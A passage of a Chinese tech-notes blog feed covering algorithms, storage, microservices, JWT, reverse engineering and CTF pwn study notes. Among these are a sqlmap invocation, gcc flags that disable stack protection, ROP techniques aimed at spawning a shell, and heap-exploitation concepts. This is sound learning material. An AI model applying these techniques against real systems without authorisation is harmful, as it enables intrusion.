func majorityElement(nums []int) int { iter, most := 0, 0 for _,num := range nums { if iter == 0 { most, iter = num, iter+1 } else if most == num { iter += 1 } else { iter -= 1 } } count, sz := 0, len(nums) for _,num := range nums { if num == most { count += 1 } if count * 2 &amp;gt; sz { return most } } return -1 }</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/</guid><description>在实习过程中，在字节跳动内部分享上学习的东西
:floppy_disk:客户端本地存储 # 作用 # 客户端本地存储主要有以下的几个作用：
作为网络 IO 的缓存：缓存图片、缓存接口的 Response； 保存配置或者数据：配置信息、状态信息、日志信息、Crash 信息等； 作为内存的 Backing Store：暂存大文件、征用扩展内存； 常见存储方案分析 # 如何分析各种存储方案，主要考虑以下几个特性：
读写性能：平均读写性能、最坏读写性能； 并发性能：是否线程安全、读写操作互相并发的能力； 数据完整性：数据损失或丢失的概率； 空间性能：存储相同的数据，需要的磁盘与内存空间； Plist # plist 是一种 xml 格式，是 iOS 中最常用的配置存储数据格式，下面是一个例子：
&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt; &amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;quiz&amp;lt;/key&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;question&amp;lt;/key&amp;gt; &amp;lt;array&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;text&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;What does &amp;#39;API&amp;#39; stand for?</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</guid><description>常见安全工具汇总 # 关于各种工具的用途总结：
WEB 工具 # shodan：
# 安装 $ pip install shodan # 初始化 $ shodan init &amp;lt;API KEY&amp;gt; # 详细见：https://cli.shodan.io/ sqlmap：
# 安装 $ pip install sqlmap # 使用 $ sqlmap -u &amp;lt;target website&amp;gt; 密码学工具 # z3，pycrypto，sagemath
PE Portable Executable # VirusTotal：一个分析病毒文件的在线网站。
pefile：一个静态分析 PE 文件的 python 库。源代码
capstone、keystone-enginne：一个处理反汇编程序的库和一个处理汇编程序的库，可以使用 python、c++ 等语言编写。源代码</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8/</guid><description>微服务概念入门 # 服务发现 # https://zhuanlan.zhihu.com/p/161277955
使用一个名字服务器进行服务发现。解决分布式微服务的网络调用结构问题。
服务限流 # https://zhuanlan.zhihu.com/p/65900436
服务限流算法：
计数器算法、漏桶算法、令牌算法 服务雪崩降级熔断 # 服务雪崩：
一个服务失败，导致整条链路的服务都失败的情形，我们称之为服务雪崩。 服务熔断：
当下游的服务因为某种原因突然变得不可用或响应过慢，上游服务为了保证自己整体服务的可用性，不再继续调用目标服务，直接返回，快速释放资源。 服务降级：
当下游的服务因为某种原因响应过慢，下游服务主动停掉一些不太重要的业务，释放出服务器资源，增加响应速度。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</guid><description>数据库基本概念 # 什么是 NOSQL？
NoSQL(NoSQL = Not Only SQL )，意即&amp;quot;不仅仅是SQL&amp;quot;。 ACID 理论 # 关系型数据库有事务（transaction）的概念，事务遵循 ACID 原则：
A (Atomicity 原子性)：事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。 C (Consistency 一致性)： I (Isolation 独立性)： D (Durability 持久性)： 分布式系统 # 什么是分布式系统？
简单的来说，一个分布式系统是一组计算机系统一起工作，在终端用户看来，就像一台计算机在工作一样。这组一起工作的计算机，拥有共享的状态，他们同时运行，独立机器的故障不会影响整个系统的正常运行。 分布式系统的优点：
**可靠性（容错） ：**分布式计算系统中的一个重要的优点是可靠性。一台服务器的系统崩溃并不影响到其余的服务器。
**可扩展性：**在分布式计算系统可以根据需要增加更多的机器。
**资源共享：**共享数据是必不可少的应用，如银行，预订系统。
**灵活性：**由于该系统是非常灵活的，它很容易安装，实施和调试新的服务。
**更快的速度：**分布式计算系统可以有多台计算机的计算能力，使得它比其他系统有更快的处理速度。
**开放系统：**由于它是开放的系统，本地或者远程都可以访问到该服务。
**更高的性能：**相较于集中式计算机网络集群可以提供更高的性能（及更好的性价比）。
分布式系统的缺点：
**故障排除：**故障排除和诊断问题。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/</guid><description>版本控制 # 现在流行的版本系统主要分为集中式版本系统、分布式版本系统 2 大类。
集中式版本系统 # 主要的集中式版本控制系统：
CVS (Concurrent Versions System) free software，以 GNU 版权发行，许多老的 GNU 项目都用 CVS，2008 年后更新不活跃。 Subversion (Apache Subversion) Apache License，top-level Apache project，兼容 CVS。 SVN 则是最著名的集中式版本控制系统。 SVN 的主要特点：
SVN 需要一个中心服务器，用来保存所有文件的所有修订版本。
客户端只保存最新的版本或者设置为检出某一个历史版本，客户端必须在连接到中心服务器之后才能做出检出某个版本、查询文件修改历史、提交更新等操作。
每一次 commit 之前，都需要连接中心服务器获取最新的文件版本，如果中心服务器宕机，则你无法提交任何更新，也无法将项目回溯到历史版本。
如果中心服务器发生磁盘故障，而你又没有做任何备份，你将会丢失当前和历史的所有数据。
对 分支 的支持较弱，SVN 的分支就是一个完整、独立的文件夹，分支的创建和合并代价都非常高（实际可能会通过硬连接的方式节省空间）；
无法追踪目录文件的变化，变更目录需要使用 SVN 命令。
管理员能够轻松掌握每一个开发者的权限（Git 自身不支持分支保护）。
分布式版本系统 # 主要的分布式管理系统：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%94%A8%E6%88%B7%E7%B3%BB%E7%BB%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%94%A8%E6%88%B7%E7%B3%BB%E7%BB%9F/</guid><description>参考：
https://sherryhsu.medium.com/session-vs-token-based-authentication-11a6c5ac45e4 https://jwt.io/introduction https://stackoverflow.com/questions/43452896/authentication-jwt-usage-vs-session https://en.wikipedia.org/wiki/OAuth 用户系统 # Session Base Authentication # 流程简介 # 最传统的用户系统，django 的默认实现，用户登陆时后服务端会为当前会话创建一个 session 并且将 sessionID 作为 cookie 设置到客户端上，用户每次需要访问敏感资源时需要带上 sessionID，服务端通过 session 判断用户是否登陆成功。简单流程如下：
JWT (Json Web Token) # 格式 # JWT 是一种被写入 RFC7519 的协议标准。一个 JWT 的格式由 Base64 加密的 “Header”、“Payload”、“Signature” 三个部分由 . 字符拼接而成：
上图中可以看出三部分的作用：
header 部分表示当前 JWT 的算法； playload 则存储了当前登陆用户的信息（在传统基于 session 的登陆系统下，这一信息一般是存储在服务端），Playload 分为 Registered claims/Public claims/Private claims 三个类型； signature 用服务端的私钥进行 HMAC 确保 playload 中的信息没有被修改过； 工作流 # 在认证成功后，服务器会返回给客户端一个 JWT。当客户端需要访问任何敏感资源时，需要设置 Authorization 的请求头：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%B4%A0%E6%95%B0%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%B4%A0%E6%95%B0%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95/</guid><description>素数相关算法 # 素性检测 # 关于一些素性检测的底层算法，在学校时，信息安全数学基础课上讲过。
素数数量计算 # Sieve of Eratosthenes，筛法：
algorithm Sieve of Eratosthenes is input: an integer n &amp;gt; 1. output: all prime numbers from 2 through n. let A be an array of Boolean values, indexed by integers 2 to n, initially all set to true. for i = 2, 3, 4, ..., not exceeding √n do if A[i] is true for j = i2, i2+i, i2+2i, i2+3i, .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid><description>Android 程序分析环境搭建 # Windows 环境搭建 # 安装 JDK。以下命令检测是否安全成功。
$ java -version 安装 android-sdk。不知道哪次更新之后，这些命令行工具全部集成到了 Android Studio 里面，在 Android Studio 中打开 SDK Manager 就可以安装。
以下命令检测两个工具是否安装成功：
$ adb --version Android Debug Bridge version 1.0.39 ... $ emulator -version Android emulator version 28.0.23.0 (build_id 5264690) (CL:be2be19ca0131957449e8c0ded5e55070f9537b0) ... NOTICE:
本书中的环境搭建大多都过时了，开发工具建议直接安装 Android Studio，逆向工具建议直接安装吾爱破解的安装包。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F/</guid><description>如何分析安卓程序 # 第一个安卓程序 # 已经上传至 github：https://github.com/shesl-meow/AndroidReverse.git
编译生成 .apk 文件，可以直接在 Android Studio 中进行操作。
破解第一个程序 # 反编译 APK 文件 # 安装 apktool，这是一个 github 的开源软件：https://github.com/iBotPeaches/Apktool
在 Windows 下，可以直接使用 choco 进行安装：
&amp;gt; choco install apktool 关于 apktool 的使用教程可以参考：apktool
分析 APK 文件 # 在目标文件夹下（与开发时的源码目录结构是一样的）：
smali 目录存放了程序的所有反汇编代码 res 目录下存放了程序中所有的资源文件 以上的 Android 程序的分析步骤：
res/values/strings.xml 被加密存储为 resources.arsc，当程序被反汇编成功后这个文件也被解密了出来。
在这里存储了 Android 程序中存储使用的所有字符串。
使用以下的命令查找 注册失败 的提示信息：
$ cat ./res/values/strings.xml | grep 注册错误 &amp;lt;string name=&amp;#34;unsuccess_msg&amp;#34;&amp;gt;注册错误&amp;lt;/string&amp;gt; 所有的字符串都在 gen/&amp;lt;packagename&amp;gt;/R.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/3.dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/3.dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/</guid><description>Android Dalvik 虚拟机 # 虽然 Android 平台使用 Java 语言来开发应用程序，但 Android 程序却不是运行在标准 Java 虚拟机上，而是 Dalvik Virtual Machine（Dalvik 虚拟机）。
Dalvik 虚拟机的特点 # 与 Java 虚拟机的区别 # 主要区别：
Java 虚拟机运行的是 Java 字节码，Dalvik 虚拟机运行的是 Dalvik 字节码。
所有的 Dalvik 字节码由 Java 字节码转化而来，并且被打包到一个 DEX（Dalvik Executable）可执行文件中。Dalvik 虚拟机通过解释 DEX 文件来执行这些字节码。
Dalvik 可执行文件体积更小。
Android SDK 中有一个叫 dx 的工具负责将 Java 字节码转换为 Dalvik 字节码。
Java 虚拟机与 Dalvik 虚拟机架构不同。
Java 虚拟机基于栈结构。程序在运行时需要频繁地从栈上读取或写入数据。
Dalvik 虚拟机基于寄存器架构。数据的访问通过寄存器间直接传递。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/4.android%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/4.android%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</guid><description>Android 可执行文件 # Android 程序的生成步骤 # Google 提供了 Android SDK 供程序员来开发 Android 平台的软件。每个软件在最终发布时会打包成一个 apk 文件，将 apk 文件 传送到 Android 设备中运行即可安装。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/1.tour/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/1.tour/</guid><description>Tour of Computer-Systems # Compilation # Compiler: Program are translated into different forms.
A classic compiler work in following sequence:
Preprocessing Phase: Source program (hello.c) $$\Rightarrow$$ Pre-Processor (cpp) $\Rightarrow$ Modified source program (hello.i). Compilation Phase: Compiler (cc1) $$\Rightarrow$$ Assembly program (hello.s). Assembly Phase: Assembler (as) $$\Rightarrow$$ Relocatable object programs (hello.o). Linking Phase: Linker (ld) $$\Rightarrow$$ Executable object program (hello) We need to understand compilation systems work:</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/2.representandmanipulate/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/2.representandmanipulate/</guid><description>Respresenting and Manipulating Information #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/1.canary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/1.canary/</guid><description>学习资料：
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/Canary/ https://blog.csdn.net/Virtual_Func/article/details/48789947 http://blog.fourthbit.com/2014/12/23/traffic-analysis-of-an-ssl-slash-tls-session 学习内容：
Linux-Pwn，安全保护机制 Canary # 由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。
PostScript：glibc：The GNU C Library, commonly known as glibc, is the GNU Project&amp;rsquo;s implementation of the C standard library. 原理 # canary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。
PostScript：gcc 中使用：
$ gcc -fstack-protector test.c # 启用保护，不过只为局部变量中含有数组的函数插入保护 $ gcc -fstack-protector-all test.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/2.protection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/2.protection/</guid><description>参考：
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/
https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/
保护手段 # Canary # 简单地说：
函数在调用时，在返回地址与局部变量之间设置了一个用户不可知的 Canary； 在函数结束调用时，函数检查这个 Canary 是否被修改，否则抛出异常； gcc 在编译时可以控制以下的几个参数控制栈的保护程度：
# 禁用栈帧保护 $ gcc -fno-stack-protector a.c # 开启栈帧保护 $ gcc -fstack-protector a.c # 启用栈帧保护，为所有函数插入保护代码 $ gcc -fstack-protector-all a.c Fortify # Fortify 是 gcc 的一个检测工具，它会在编译时检测危险的字符串操作函数，比如 memcpy、strcpy 等。
它有弱强两种使用模式：
D_FORTIFY_SOURCE 设置为 1 进行较弱的检查：
程序编译时就会进行检查，但是不会改变程序的功能； 程序仅仅在编译时进行检查，运行时不会检查； $ gcc -D_FORTIFY_SOURCE=1 t.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/3.rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/3.rop/</guid><description>ROP 技术 # 基本 ROP # ret2text # ret2text 即控制程序执行程序本身已有的的代码 (.text)。例子
ret2shellcode # ret2shellcode，即控制程序执行 shellcode 代码。一般来说，shellcode 需要我们自己填充。例子
ret2syscall # ret2syscall，即控制程序执行系统调用，获取 shell。例子
此时就需要用到 ROP 链了，得到 ROP 链可以使用 ROPgadget 这个工具，见 TIPS
ret2libc # ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。
一般情况下，我们会选择执行 system(&amp;quot;/bin/sh&amp;quot;)，故而此时我们需要知道 system 函数的地址。
中级 ROP # ret2csu # 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。
这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/0.%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/0.%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</guid><description>漏洞类型 # Off By One 漏洞 # 漏洞原理 # 严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。
一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。
利用思路 # 根据溢出的字节类型，可以分为以下两种情况：
溢出字节为任意可以控制的字节。通过修改大小造成块之间出现重叠，从而泄露或覆盖其他块的数据。 溢出字节为 NULL 字节。在 size=0x100 时，溢出 NULL 字节会使 prev_in_use 位被清零： 这时可以选择 unlink 方法进行处理（漏洞利用方式 unlink）； 另外 prev_size 域就会启用，伪造 prev_size 可以造成块之间的重叠（glibc2.28 已经修复）。 使用示例 # Asis CTF 2016 b00ks
Use After Free 漏洞 # 漏洞原理 # Use After Free 即释放后重用，可以利用的漏洞主要分为以下两种情况：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/1.unlink/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/1.unlink/</guid><description>Unlink # unlink 是什么？
它是 glibc 中通过宏实现的一个函数，在 GlibcHeap 中有源码介绍； unlink 的目的是将 bin 链表中的一个元素从链表中取出；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E6%AD%A3%E5%90%91%E5%9F%BA%E7%A1%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E6%AD%A3%E5%90%91%E5%9F%BA%E7%A1%80/</guid><description>正向基础 # App 结构与构建 # 应用包的本质？
iOS 中的应用包有 .app 与 .ipa 两种形式，前者就是一个文件夹，后者是这个文件夹的 zip 格式压缩包（Android 中的 .apk）。
如何获取一个线上 App 的 ipa 文件包？
在 iTunes 之后，苹果官方提供了一个方法进行 ipa 的下载，即应用：Apple Configurator 2。在这个应用中下载了 App 之后，可以在以下的文件夹下找到 ipa 文件：
/Users/shesonglin/Library/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps App 签名 # 签名原理 # App 签名是一个基于 CA 的认证架构，CA 指 Certificate Authority，对于 CA 机构的信任是一切现代信息安全互信体系的基石。
CA 的认证流程大致如下：
上面的流程大致的阐述了如何实现一个用户，如何实现对一个未知身份的开发者的信任问题。
对于这一体系在 App 信任中的应用，则可以用下面的流程阐述：
具体在 iOS 中，App 签名这个过程中有以下关键的几个文件：
CertificateSigningRequest.certSigningRequest：对应上图中的 Dev-PublicKey 的打包文件； iOS_development.cer；对应上图一中绿色的 certificate 文件； Entitlements 授权文件，一般是 plist 后缀：在上图二中，对 App 的哈希过程中，也会加入 App 的授权信息； 重签名 # 一旦改变了 App 的二进制内容或任何授权内容，上面的授权信息 distribution certificate 就会被破坏。App 信息完整性验证这一过程就会失败，因此我们就需要对 App 进行重签名。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</guid><description>静态分析 # iOS 的静态分析工具主要有 Hopper/IDA Pro。
Hopper # IDA Pro # 下面是一些 IDA Pro 的常用功能与快捷键：
字符串搜索：Alt+T (Windows)；Option+T (Mac OS)； 跳转地址：在 IDA 中按 &amp;ldquo;G&amp;rdquo;，输入指定的跳转地址即可跳转； 编写注释： 可重复注释：按 &amp;ldquo;;&amp;rdquo; 分号，可以添加可重复注释，这种注释会同时出现在其交叉引用的地方； 非重复注释：按 &amp;ldquo;:&amp;rdquo; 冒号，可添加重复注释，优先级大于前者，不过不会出现在交叉引用的位置； 伪代码注释：直接按 &amp;ldquo;/&amp;rdquo; 分号，可以为伪代码添加注释； 变量重命名：单击目标变量，按 &amp;ldquo;N&amp;rdquo; 进行重命名； 查看交叉引用：选中函数/变量，按 &amp;ldquo;X&amp;rdquo; 可以查看当前位置被哪些地方引用了； 进制转换：伪代码展示的数字默认进制是十进制，可以按 &amp;ldquo;H&amp;rdquo; 进行进制转换； 类型声明：变量类型/方法参数签名等，如果 IDA 默认识别有问题，可以按 &amp;ldquo;Y&amp;rdquo; 进行重声明； 格式转化： 在被解析为数据的位置按 &amp;ldquo;C&amp;rdquo; 可以解析为代码，反之按 &amp;ldquo;D&amp;rdquo;； 对于一连串的 ASCII 字符，按 &amp;ldquo;A&amp;rdquo; 可以将一连串地址的字符转化为字符串； 按 &amp;ldquo;U&amp;rdquo; 可以取消对数据段的解析； 静态分析实践 # 产物分析 # 我们使用 XCode 默认建立的工程，在 viewDidLoad 里面编写了一段代码，看看这写代码是如何实现的：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/3.%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/3.%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/</guid><description/></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%82%AC%E7%BA%BF%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%82%AC%E7%BA%BF%E6%B3%95/</guid><description/></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E5%9B%BE%E8%AE%BA/tarjan/</link><pubDate>Mon, 01 Jan 0001 00:00:00 